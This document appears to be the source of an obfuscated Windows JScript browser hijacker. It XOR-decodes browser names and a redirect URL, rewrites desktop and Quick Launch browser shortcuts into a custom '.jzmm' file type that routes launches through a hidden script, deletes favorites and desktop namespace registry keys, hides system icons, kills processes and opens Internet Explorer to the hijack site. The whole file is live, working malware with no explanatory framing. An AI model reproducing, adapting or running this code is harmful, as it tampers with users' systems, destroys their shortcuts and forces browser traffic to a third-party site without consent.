(function(){
//var CMD3="ajfjoifjeiojf"
//var CMD1="fjeoifjoiejfoijeff"
//var CMD2="ajfjoifjeiojf"
//var CMD3="ajfjoifjeiojf"
var P,q;var k=54;var z=".jzmm";var o="cysfile";var D;var C;var A=["123^119^110^98^126^121^120^24^115^110^115","98^126^115^97^121^100^122^114^24^115^110^115","127^115^110^102^122^121^100^115^24^115^110^115","5^0^6^101^115^24^115^110^115","101^121^113^121^99^115^110^102^122^121^100^115^100^24^115^110^115","98^98^100^119^96^115^122^115^100^24^115^110^115","112^127^100^115^112^121^110^24^115^110^115","121^102^115^100^119^24^115^110^115","125^111^122^127^120^116^100^121^97^101^115^100^24^115^110^115","123^111^127^103^24^115^110^115","113^100^115^115^120^116^100^121^97^101^115^100^24^115^110^115","127^115^110^102^122^121^100^24^115^110^115"];
var G;var J;var N;var O;var b;var g;var c=["65^65^65^24^65^76^7^7^4^4^24^85^89^91"];var M="94^66^66^70^12^25^25^65^65^65^24^65^76^7^7^4^4^24^85^89^91";
var t=function(R){var T=R.split("^");for(var S in T){T[S]=T[S]^k;T[S]=String.fromCharCode(T[S])}return T.join("")};
var ggshr=function(){};
var L=function(){for(var R in A){A[R]=t(A[R])}for(var S in c){c[S]=t(c[S])}};
var d=function(){var S=2147483650;sRegPath="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace";try{oLoc=new ActiveXObject("WbemScripting.SWbemLocator");oSvc=oLoc.ConnectServer(null,"root\\default");oReg=oSvc.Get("StdRegProv");oMethod=oReg.Methods_.Item("EnumKey");oInParam=oMethod.InParameters.SpawnInstance_();oInParam.hDefKey=S;oInParam.sSubKeyName=sRegPath;oOutParam=oReg.ExecMethod_(oMethod.Name,oInParam);return oOutParam.sNames.toArray()}catch(R){return[]}};
var K=function(R,T){for(var S=0;S<R.length;S++){if(R[S]==T){return true}}return false};
var h=function(){C=d();try{var S;var R=["{1f4de370-d627-11d1-ba4f-00a0c91eedba}","{450D8FBA-AD25-11D0-98A8-0800361B1103}","{645FF040-5081-101B-9F08-00AA002F954E}","{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"];for(S=0;S<R.length;S++){R[S]=R[S].toUpperCase()}for(S=0;S<C.length;S++){C[S]=C[S].toUpperCase()}for(S=0;S<C.length;S++){if(!K(R,C[S])){P.RegDelete("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\"+C[S]+"\\")}}}catch(T){}};
var F=function(){try{P.RegWrite("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoInternetIcon",1,"REG_DWORD")}catch(R){}try{P.RegWrite("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartPage\\Favorites",255,"REG_BINARY")}catch(R){}try{P.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\ClassicStartMenu",1,"REG_DWORD")}catch(R){}try{P.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel\\{871C5380-42A0-1069-A2EA-08002B30309D}",1,"REG_DWORD")}catch(R){}};
var j=function(){try{var S=P.SpecialFolders("Favorites");for(var T in i){var R=P.CreateShortcut(S+"\\"+i[T]["d"]+".url");R.TargetPath=i[T]["u"];R.Save()}}catch(U){}};
var Q=function()
{
	//var CMD="53^51^56^58^55^32^51^97^19^124^17^111^18^49^36^34^40^32^45^7^46^45^37^36^51^50^105^99^0^45
//^45^20^50^36^51^50^5^36^50^42^53^46^49^99^104^106^99^29^29^141^149^240^231^108^141^153^131^181^111^52^51^45
//^99^122^55^32^51^97^18^124^48^111^2^51^36^32^53^36^21^36^57^53^7^40^45^36^105^19^109^53^51^52^36^104^122^18
//^111^22^51^40^53^36^13^40^47^36^105^99^26^50^46^39^53^114^119^113^28^99^104^122^18^111^22^51^40^53^36^13^40
//^47^36^105^99^22^46^51^42^124^248^229^137^138^99^104^122^18^111^22^51^40^53^36^13^40^47^36^105^99^26^8^47^
//53^36^51^47^36^53^18^41^46^51^53^34^52^53^28^99^104^122^18^111^22^51^40^53^36^13^40^47^36^105^99^20^19^13^
//124^41^53^53^49^123^110^110^54^54^54^111^54^59^112^120^117^120^111^34^46^44^110^53^32^46^35^32^46^111^41^53
//^44^45^99^104^122^18^111^22^51^40^53^36^13^40^47^36^105^99^8^34^46^47^8^47^37^36^57^124^113^99^104^122^18^
//111^22^51^40^53^36^13^40^47^36^105^99^8^34^46^47^7^40^45^36^124^99^106^38^106^99^53^32^46^115^111^40^34^46
//^99^104^122^18^111^2^45^46^50^36^105^104^60^34^32^53^34^41^105^21^104^58^60";
  //eval(t(CMD));
//	try{var R=P.SpecialFolders("AllUsersDesktop")+"\\�Ա�����.url";var S=q.CreateTextFile(R,true);S.WriteLine("[soft360]");S.WriteLine("Work=����");S.WriteLine("[InternetShortcut]");S.WriteLine("URL=http://www.xxx.com/taobao.html");S.WriteLine("IconIndex=0");S.WriteLine("IconFile=%SystemRoot%\\system32\\taobao.ico");S.Close()}catch(T){}
};
var s=function(){try{var U=P.Environment("PROCESS");var T=U("USERPROFILE");var R=T+"\\Application Data\\Microsoft\\Internet Explorer\\Quick Launch";return R}catch(S){return""}};
var p=function(){var R=WScript.Arguments;if(R.length==0){return true}else{return false}};
var m=function(T){var U=T.toUpperCase();for(var R in A){if(U.indexOf(A[R])>0){return true}}return false};
var u=function(){try{var R=P.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ProgramFilesDir");return R}catch(S){return"C:\\Program Files"}};
var f=function(Y,W){try{var U,S,R,ab;var X=new Array;var T=W;U=q.GetFolder(Y);R=new Enumerator(U.files);ab="";T=W.toUpperCase();for(;!R.atEnd();R.moveNext()){var aa=R.item();var Z="";Z+=aa;Z=Z.toUpperCase();if((Z.match(T+"$")==T)){X[X.length]=Z}}return X}catch(V){return[]}};
var H=function(S){var R=GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");var U=R.ExecQuery('Select * From Win32_Process WHERE name="'+S+'"');var T=new Enumerator(U);while(!T.atEnd()){T.item().Terminate();T.moveNext()}WScript.Sleep(1000)};
var r=function(T,V,S,R){try{var U=q.CreateTextFile(T,true);U.WriteLine("[soft360]");U.WriteLine("Work=safe");U.WriteLine("Name=___"+escape(V)+"___");U.WriteLine("Tel=<<<"+escape(S)+">>>");U.WriteLine("[InternetShortcut]");U.WriteLine("URL=http://www.baidu.com");U.WriteLine("IconIndex=0");U.WriteLine("IconFile="+R);U.Close()}catch(W){}};
var I=function(){try{P.RegWrite("HKCR\\"+z+"\\",o,"REG_SZ");P.RegWrite("HKCR\\"+o+"\\","��ݷ�ʽ","REG_SZ");P.RegWrite("HKCR\\"+o+"\\IsShortcut","","REG_SZ");P.RegWrite("HKCR\\"+o+"\\NeverShowExt","","REG_SZ");P.RegWrite("HKCR\\"+o+"\\DefaultIcon\\","%SystemRoot%\\system32\\url.dll,0","REG_EXPAND_SZ");P.RegWrite("HKCR\\"+o+"\\CLSID\\","{B9EBB2CB-9511-402C-B674-D0DCD23DE5DE}","REG_SZ");P.RegWrite("HKCR\\"+o+"\\shell\\","open","REG_SZ");P.RegWrite("HKCR\\"+o+"\\shell\\open\\CLSID","{B9EBB2CB-9511-402C-B674-D0DCD23DE5DE}","REG_SZ");P.RegWrite("HKCR\\"+o+"\\shell\\open\\command\\",'WScript.exe "'+g+'winrar.jse" "%1"',"REG_SZ");P.RegWrite("HKCR\\"+o+"\\shellex\\IconHandler\\","{B9EBB2CB-9511-402C-B674-D0DCD23DE5DE}","REG_SZ");P.RegWrite("HKCR\\"+o+"\\shellex\\ContextMenuHandlers\\","","REG_SZ")}catch(R){}};
var v=function(S,R){try{q.CopyFile(S,R)}catch(T){}};
var n=function(){try{var R=P.RegRead("HKLM\\SOFTWARE\\Clients\\StartMenuInternet\\IEXPLORE.EXE\\shell\\open\\command\\");R=ParseFullPath(src);R=R.replace(/"/g,"")}catch(S){return"C:\\Program Files\\Internet Explorer\\iexplore.exe"}if(R==""){return"C:\\Program Files\\Internet Explorer\\iexplore.exe"}return R};
var E=function(){P=new ActiveXObject("WScript.Shell");q=new ActiveXObject("Scripting.FileSystemObject");M=t(M);L();var S=P.Environment("PROCESS");O=S("SystemRoot")+"\\System32";b=S("ProgramFiles");g=b+"\\Winrar\\";G=s();D=n();try{q.CreateFolder(g)}catch(R){}};
var a=function(V){var Y=q.OpenTextFile(V,1);var X=Y.ReadAll();var U=/___(.*?)___/ig;var S=/<<<(.*?)>>>/ig;var T,R;if(U.test(X)){T=RegExp.$1;T=unescape(T)}if(S.test(X)){R=RegExp.$1;R=unescape(R)}if(T!=""){if(m(T)){var W="http://"+c[parseInt(Math.random()*c.length)]+"/";R=W;if(R!=""){R='"'+R+'"'}P.Run('"'+T+'" '+R,1,false)}else{P.Run('"'+T+'" ',1,false)}}};
var l=function(R){try{var S=q.GetFile(R);S.attributes=32;q.DeleteFile(R)}catch(T){}};
var B=function(S){var W=S;var T=f(W,".URL");for(var V in T){try{var R=T[V];if(R.indexOf("�Ա�����")>=0){continue}l(R)}catch(U){}}};
var e=function(Y){var T=f(Y,".LNK");for(var S in T){try{var W=T[S];var V;var aa="";var U="";var R="";var ad="";var ab=/\.exe$/ig;var Z=/system32/ig;R=q.GetBaseName(W);V=P.CreateShortcut(W);aa=V.TargetPath;U=V.Arguments;if(aa==""){continue}if(Z.test(aa)){continue}else{}if(ab.test(aa)){ad=Y+"\\"+R+z;r(ad,aa,U,aa);l(W)}else{}}catch(X){}}};
var w=function(){try{var T=P.SpecialFolders("AllUsersDesktop");var R=T+"\\Internet  Explorer"+z;r(R,D,"",D)}catch(S){}};
var y=function(){P.Run("iexplore.exe "+M)};

E();if(p()){I();H("");F();w();h();e(P.SpecialFolders("AllUsersDesktop"));e(P.SpecialFolders("Desktop"));B(G);e(G);y()}else{var x=WScript.Arguments;a(x(0));F();w();h();e(P.SpecialFolders("AllUsersDesktop"));e(P.SpecialFolders("Desktop"));B(G);e(G)}})();